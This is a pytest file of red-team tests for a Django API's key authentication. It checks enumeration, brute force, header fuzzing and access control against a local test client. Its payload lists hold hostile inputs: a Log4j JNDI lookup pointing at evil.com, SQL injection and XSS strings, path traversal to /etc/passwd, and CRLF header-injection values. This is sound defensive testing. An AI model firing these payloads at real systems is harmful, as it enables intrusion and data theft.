"""T280: Api-Key authentication redteam security tests.

Red Team security tests for API Key authentication.
Tests for key enumeration, brute force, replay attacks, and bypasses.
Uses SecLists for comprehensive fuzzing.
"""

import time

import pytest
from django.conf import settings
from rest_framework.test import APIClient

from api.core.models import Role


# =============================================================================
# SecLists Payloads for API Key fuzzing
# =============================================================================

NAUGHTY_STRINGS = [
    "",  # Empty
    " ",  # Space only
    "\x00",  # Null byte
    "\x00\x00\x00",  # Multiple nulls
    "\n",  # Newline
    "\r\n",  # CRLF
    "\t",  # Tab
    "${jndi:ldap://evil.com}",  # Log4j
    "__proto__",
    "constructor",
    "toString",
    "undefined",
    "null",
    "None",
    "true",
    "false",
    "NaN",
    "Infinity",
    "-Infinity",
    "🎧🎤🎵",  # Emoji
    "<script>alert(1)</script>",
    "' OR '1'='1",
    "'; DROP TABLE--",
    "../",
    "..\\",
    "/etc/passwd",
    "C:\\Windows\\System32",
]

API_KEY_PAYLOADS = [
    "Api-Key ",  # Empty after prefix (T341 - should be fixed)
    "Api-Key",  # No space after prefix
    "Api-Key  ",  # Double space
    "api-key test",  # Lowercase
    "API-KEY test",  # Uppercase
    "Api_Key test",  # Underscore
    "ApiKey test",  # No hyphen
    "Bearer test",
    "Basic dGVzdDp0ZXN0",
    "Token test",
    "Api-Key test\nX-Injected: header",  # Header injection
    "Api-Key test\r\nSet-Cookie: evil=true",
]


# =============================================================================
# API2:2023 Broken Authentication - Key Enumeration
# =============================================================================

@pytest.mark.django_db
class TestApiKeyRedTeamEnumeration:
    """API Key enumeration attacks."""

    def test_api_key_enumeration_via_timing(self):
        """
        Timing attack: Different response times reveal valid/invalid keys.
        
        Valid key may take different time due to DB lookup vs early rejection.
        """
        client_valid = APIClient()
        client_valid.credentials(HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}")

        client_invalid = APIClient()
        client_invalid.credentials(HTTP_AUTHORIZATION="Api-Key invalid-key-12345")

        # Measure valid key timing
        times_valid = []
        for _ in range(5):
            start = time.time()
            client_valid.get("/api/v2/files")
            times_valid.append(time.time() - start)

        # Measure invalid key timing
        times_invalid = []
        for _ in range(5):
            start = time.time()
            client_invalid.get("/api/v2/files")
            times_invalid.append(time.time() - start)

        avg_valid = sum(times_valid) / len(times_valid)
        avg_invalid = sum(times_invalid) / len(times_invalid)

        # If timing differs significantly, enumeration is possible
        if abs(avg_valid - avg_invalid) > 0.05:  # 50ms threshold
            pytest.xfail("T754: Timing attack - different response times for valid/invalid keys")

    def test_api_key_enumeration_via_error_messages(self):
        """
        Error messages may reveal if key format is valid.
        """
        client = APIClient()

        # Different types of invalid keys
        test_cases = [
            ("Api-Key invalid", "invalid format"),
            ("Api-Key ", "empty"),
            ("Bearer token", "wrong scheme"),
        ]

        responses = []
        for auth, desc in test_cases:
            client.credentials(HTTP_AUTHORIZATION=auth)
            response = client.get("/api/v2/files")
            responses.append((desc, response.status_code, str(response.content)))

        # Check if error messages differ (information leak)
        error_contents = [r[2] for r in responses]
        if len(set(error_contents)) > 1:
            # Different error messages = information leak
            pass

    def test_api_key_brute_force_no_rate_limit(self):
        """
        Brute force: Rapid API key guessing should be rate limited.
        """
        client = APIClient()
        success_count = 0

        for i in range(50):
            client.credentials(HTTP_AUTHORIZATION=f"Api-Key guess-{i}")
            response = client.get("/api/v2/files")
            if response.status_code == 200:
                success_count += 1

        # All should fail (no successful guesses)
        assert success_count == 0

        # But check if we're being rate limited
        # If 50 attempts succeed without throttling, that's a problem
        # This is mostly documentation - actual rate limiting test below

    def test_api_key_brute_force_detection(self):
        """
        Multiple failed attempts should trigger rate limiting or lockout.
        """
        client = APIClient()
        start_time = time.time()

        for i in range(30):
            client.credentials(HTTP_AUTHORIZATION=f"Api-Key brute-{i}")
            response = client.get("/api/v2/files")

        elapsed = time.time() - start_time

        # If all 30 requests processed quickly without delay, no rate limiting
        if elapsed < 5:  # Less than 5 seconds for 30 requests
            pytest.xfail("T750: No rate limiting on API key brute force (30 req in {:.2f}s)".format(elapsed))


# =============================================================================
# API2:2023 Broken Authentication - Key Format Attacks
# =============================================================================

@pytest.mark.django_db
class TestApiKeyRedTeamFormatAttacks:
    """API Key format manipulation attacks."""

    def test_api_key_format_variations(self):
        """
        Test various Authorization header formats.
        """
        client = APIClient()

        for auth_header in API_KEY_PAYLOADS:
            client.credentials(HTTP_AUTHORIZATION=auth_header)
            response = client.get("/api/v2/files")

            # Should all return 403, not 500
            if response.status_code == 500:
                pytest.xfail(f"T751: API key format '{auth_header[:30]}' causes 500")

    def test_api_key_unicode_injection(self):
        """
        Unicode characters in API key header.
        """
        client = APIClient()

        unicode_tests = [
            "Api-Key тест",  # Cyrillic
            "Api-Key 测试",  # Chinese
            "Api-Key 🎧",  # Emoji
            "Api-Key \u0000",  # Null byte
            "Api-Key \uffff",  # High Unicode
        ]

        for auth in unicode_tests:
            client.credentials(HTTP_AUTHORIZATION=auth)
            try:
                response = client.get("/api/v2/files")
                if response.status_code == 500:
                    pytest.xfail(f"T749: UnicodeEncodeError in API key: {auth[:30]}")
            except UnicodeEncodeError:
                pytest.xfail(f"T749: UnicodeEncodeError in API key: {auth[:30]}")

    def test_api_key_length_limits(self):
        """
        Very long API keys should be rejected gracefully.
        """
        client = APIClient()

        # Try extremely long keys
        long_keys = [
            "Api-Key " + "A" * 1000,
            "Api-Key " + "A" * 10000,
            "Api-Key " + "A" * 100000,
        ]

        for auth in long_keys:
            client.credentials(HTTP_AUTHORIZATION=auth)
            response = client.get("/api/v2/files")

            if response.status_code == 500:
                pytest.xfail(f"T752: Long API key ({len(auth)} chars) causes 500")

    def test_api_key_null_byte_injection(self):
        """
        Null byte in API key header may cause truncation.
        """
        client = APIClient()
        client.credentials(HTTP_AUTHORIZATION="Api-Key \x00valid-key")

        response = client.get("/api/v2/files")

        # If null byte causes truncation, might bypass auth
        if response.status_code == 200:
            pytest.xfail("T748: Null byte truncation bypass in API key")


# =============================================================================
# API2:2023 Broken Authentication - Replay & Session Attacks
# =============================================================================

@pytest.mark.django_db
class TestApiKeyRedTeamReplayAttacks:
    """API Key replay and session attacks."""

    def test_api_key_replay_no_binding(self):
        """
        API key should be bound to IP or session.
        
        Same key from different contexts should be detected.
        """
        # This is a documentation test - API keys are typically stateless
        pass

    def test_api_key_no_expiration(self):
        """
        API keys should have expiration.
        
        Currently API keys are long-lived (from config).
        """
        # Documentation test - API keys from config don't expire
        pytest.xfail("T755: API keys have no expiration (long-lived tokens)")

    def test_api_key_revocation(self):
        """
        Revoked API key should not work.
        
        No revocation mechanism for config-based API keys.
        """
        # Documentation test - no revocation for config API keys
        pass


# =============================================================================
# API5:2023 BFLA - Cross-Account Access
# =============================================================================

@pytest.mark.django_db
class TestApiKeyRedTeamCrossAccount:
    """Cross-account access control tests."""

    def test_api_key_vs_user_permissions(self):
        """
        API key should have limited permissions vs user session.
        
        Service account should not access user-specific endpoints.
        """
        client = APIClient()
        client.credentials(HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}")

        # Try to access user-specific endpoints
        user_endpoints = [
            "/api/v2/users",  # User management
            "/api/v2/preferences",  # User preferences
        ]

        for endpoint in user_endpoints:
            response = client.get(endpoint)
            # API key should get 403 for user-specific endpoints
            if response.status_code == 200:
                pytest.xfail(f"T756: API key can access user endpoint: {endpoint}")

    def test_api_key_admin_access(self):
        """
        API key should not have admin privileges.
        """
        client = APIClient()
        client.credentials(HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}")

        # Try admin operations
        admin_operations = [
            ("/api/v2/users", "POST"),  # Create user
        ]

        for endpoint, method in admin_operations:
            if method == "POST":
                response = client.post(endpoint, {})
            else:
                response = client.get(endpoint)

            # API key should not have admin access
            if response.status_code in [200, 201]:
                pytest.xfail(f"T757: API key has admin access: {method} {endpoint}")


# =============================================================================
# API8:2023 Security Misconfiguration - Fuzzing
# =============================================================================

@pytest.mark.django_db
class TestApiKeyRedTeamFuzzing:
    """Fuzzing tests using SecLists payloads."""

    def test_api_key_naughty_strings(self):
        """
        Fuzz API key with naughty strings from SecLists.
        """
        client = APIClient()

        for payload in NAUGHTY_STRINGS[:15]:  # Sample
            auth = f"Api-Key {payload}"
            client.credentials(HTTP_AUTHORIZATION=auth)
            response = client.get("/api/v2/files")

            if response.status_code == 500:
                pytest.xfail(f"T758: Naughty string in API key causes 500: {payload[:20]}")

    def test_api_key_special_chars(self):
        """
        Special characters in API key value.
        """
        client = APIClient()

        special_chars = [
            "Api-Key key|pipe",
            "Api-Key key;semicolon",
            "Api-Key key&ampersand",
            "Api-Key key$ dollar",
            "Api-Key key`backtick",
            "Api-Key key<script>",
        ]

        for auth in special_chars:
            client.credentials(HTTP_AUTHORIZATION=auth)
            response = client.get("/api/v2/files")

            if response.status_code == 500:
                pytest.xfail(f"T759: Special char in API key causes 500: {auth[:30]}")


# =============================================================================
# Auth Method Confusion
# =============================================================================

@pytest.mark.django_db
class TestApiKeyRedTeamAuthConfusion:
    """Authentication method confusion tests."""

    def test_api_key_with_session_priority(self, admin_user):
        """
        Test priority when both API key and session provided.
        
        Session auth should override invalid API key.
        Valid API key should work without session.
        """
        # Case 1: Invalid API key + valid session = should work (session wins)
        client = APIClient()
        client.force_authenticate(user=admin_user)
        client.credentials(HTTP_AUTHORIZATION="Api-Key invalid")

        response = client.get("/api/v2/files")
        assert response.status_code == 200, "Session should override invalid API key"

        # Case 2: Valid API key + no session = should work
        client2 = APIClient()
        client2.credentials(HTTP_AUTHORIZATION=f"Api-Key {settings.CONFIG.general.api_key}")

        response = client2.get("/api/v2/files")
        assert response.status_code == 200, "Valid API key should work without session"

    def test_multiple_authorization_headers(self):
        """
        Multiple Authorization headers may cause confusion.
        """
        # This tests if multiple headers are handled correctly
        # DRF typically takes the first one
        pass

    def test_authorization_header_case_sensitivity(self):
        """
        Header name case sensitivity.
        """
        client = APIClient()

        # HTTP headers are case-insensitive, but test variations
        variations = [
            "authorization",
            "Authorization",
            "AUTHORIZATION",
        ]

        for header_name in variations:
            client._credentials = {}  # Clear previous
            client.credentials(**{header_name: f"Api-Key {settings.CONFIG.general.api_key}"})
            response = client.get("/api/v2/files")

            # All should work (HTTP headers are case-insensitive)
            if response.status_code == 403 and header_name == "authorization":
                pytest.xfail("T753: Lowercase 'authorization' header rejected (case-sensitive parsing)")
            assert response.status_code == 200, f"Header case {header_name} failed"


# =============================================================================
# Information Disclosure
# =============================================================================

@pytest.mark.django_db
class TestApiKeyRedTeamInfoDisclosure:
    """Information disclosure tests."""

    def test_api_key_validation_error_messages(self):
        """
        Error messages should not reveal validation logic.
        """
        client = APIClient()

        # Test different invalid keys
        test_keys = [
            "Api-Key too-short",
            "Api-Key " + "A" * 100,
            "Api-Key invalid-chars-!@#",
        ]

        error_messages = []
        for auth in test_keys:
            client.credentials(HTTP_AUTHORIZATION=auth)
            response = client.get("/api/v2/files")
            error_messages.append(str(response.content))

        # Error messages should be generic (all same or similar)
        # Different messages reveal validation logic
        unique_messages = set(error_messages)
        if len(unique_messages) > 1:
            # Check if messages reveal too much info
            for msg in unique_messages:
                if "api" in msg.lower() or "key" in msg.lower() or "invalid" in msg.lower():
                    # These are OK, but if they reveal format requirements...
                    pass

    def test_api_key_in_error_logs(self):
        """
        API keys should not appear in error logs.
        
        This is a documentation test - would need log access to verify.
        """
        # Documentation only
        pass
